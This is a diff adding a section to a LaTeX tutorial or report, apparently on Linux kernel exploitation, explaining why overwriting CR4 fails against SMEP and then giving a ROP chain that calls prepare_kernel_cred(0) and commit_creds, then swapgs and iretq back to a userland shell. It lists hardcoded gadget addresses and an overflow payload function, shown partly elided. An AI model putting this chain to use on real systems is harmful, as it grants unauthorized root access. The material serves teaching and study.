@@ -352,6 +352,88 @@ void escalate_privs(void){
 }
 \end{lstlisting}
 \section{Adding SMEP}
+In the previous section (citare il numero) we used our piece of code which is saved in the userspace. Bvy activating SMEP, as mentioned in the paragraph (dove l'ho citato), user pages are marked as not executable while in kernel mode.
+There are two possible scenarios:
+\begin{itemize}
+\item Write an arbitrary amount of data to the kernel stack.
+\item Overwrite up to the return address on the kernel stack.
+\end{itemize}
+\subsection{Overwrite CR4}
+\label{subsect:CR4}
+The 20th bit of the CR4 control register is responsible for enabling or disabling SMEP.
+In kernel mode, we have the power to modify the contents of the control register.
+To do this there is a special instruction \lstinline{mov cr4, rdi} called by a function called native_write_cr4().
+So to be able to bypass SMEP you try to execute ROP inside this function.
+As for the commit_creeds() and prepare_kernel_cred() functions, we find the address by reading \lstinline{/proc/kallsyms}.
+To build the ROP chain we use the same approach used in userland, but instead of going back to our userland code, we go back into the native_write_cr4 (value) function, insert the value we need and then go back to the code to get the privileges.
+By reading the documentation of the CR4 bit, the developers, knowing of this possible solution to bypass SMEP, have blocked the possibility of overwriting that bit.
+Each time they are overwritten they are reset with the kernel boot settings.
+So the first scenario cannot be undertaken to obtain privileges.
+\subsection{Second scenario}
+In the second scenario, however, we will no longer exploit our userland code but only the ROP technique.
+The plan is quite simple:
+\begin{itemize}
+\item ROP into prepare_kernel_cred (0), already seen.
+\item ROP into commit_creds (), with the return value from step 1 as the parameter.
+\item ROP into swapgs; ret.
+\item ROP into iretq with the stack setup as RIP | CS | RFLAGS | SP | SS, already seen.
+\end{itemize}
+The ROP chain is trivial, but the gadgets found in the kernel cannot always be exploited, so many attempts must be made to find the right gadget.
+Some instructions might seem strange, but sometimes only some are really usable and executable.
+For example, to move the return value in step 1 (stored in rax) to rdi to move to commit_creds (), the only instructions are:
+\begin{lstlisting}
+unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx; ret
+unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8; jne 0xffffffff81964cbb; pop rbx; pop rbp; ret
+unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax; jne 0xffffffff8166fe7a; pop rbx; pop rbp; ret
+\end{lstlisting}
+They might sound a little bizarre, but all the ordinary gadgets tried are not executable.
+This is not always the case, it depends on the kernel in use, in fact very important at this stage is to try all possible solutions.
+The above code, entering 8 in rdx ignores the jne instruction, allows you to write the rax value in rdi that will be used for the commit_creds function (prepare_kernel_cred (0))
+While ROPgadget can find swapgs, it doesn't find iretq, so we use objdump to find the right address and be able to write the full ROP chain.
+\begin{lstlisting}
+unsigned long user_rip = (unsigned long)get_shell;
+
+unsigned long pop_rdi_ret = 0xffffffff81006370;
+unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret
+unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
+unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
+unsigned long commit_creds = 0xffffffff814c6410;
+unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
+unsigned long swapgs_pop1_ret = 0xffffffff8100a55f; // swapgs ; pop rbp ; ret
+unsigned long iretq = 0xffffffff8100c0d9;
+
+void overflow(void){
+    unsigned n = 50;
+    unsigned long payload[n];
+    unsigned off = 16;
+    payload[off++] = cookie;
+    payload[off++] = 0x0; // rbx
+    payload[off++] = 0x0; // r12
+    payload[off++] = 0x0; // rbp
+    payload[off++] = pop_rdi_ret; // return address
+    payload[off++] = 0x0; // rdi <- 0
+    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
+    payload[off++] = pop_rdx_ret;
+    payload[off++] = 0x8; // rdx <- 8
+    payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch
+    payload[off++] = 0x0; // dummy rbx
+    payload[off++] = 0x0; // dummy rbp
+    payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
+    payload[off++] = 0x0; // dummy rbx
+    payload[off++] = 0x0; // dummy rbp
+    payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
+    payload[off++] = swapgs_pop1_ret; // swapgs
+    payload[off++] = 0x0; // dummy rbp
+    payload[off++] = iretq; // iretq frame
+    payload[off++] = user_rip;
+    .....
+}
+
+\end{lstlisting}
+
+
+
+
 
 \section{Adding KPTI}
 
